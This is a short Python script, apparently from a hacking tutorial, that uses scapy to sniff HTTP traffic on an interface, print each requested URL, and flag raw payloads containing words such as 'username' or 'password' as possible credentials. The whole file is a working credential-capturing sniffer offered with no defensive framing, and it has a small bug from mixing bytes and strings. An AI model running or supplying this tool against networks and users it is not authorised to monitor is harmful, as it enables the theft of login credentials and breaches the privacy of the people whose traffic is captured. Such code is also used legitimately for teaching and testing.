#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for word in keywords:
            if word in load:
                return load

def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login(packet)
        if login_info:
            print("\n\n [+] Possile username/password > " + login_info + "\n\n")


sniff("eth0")
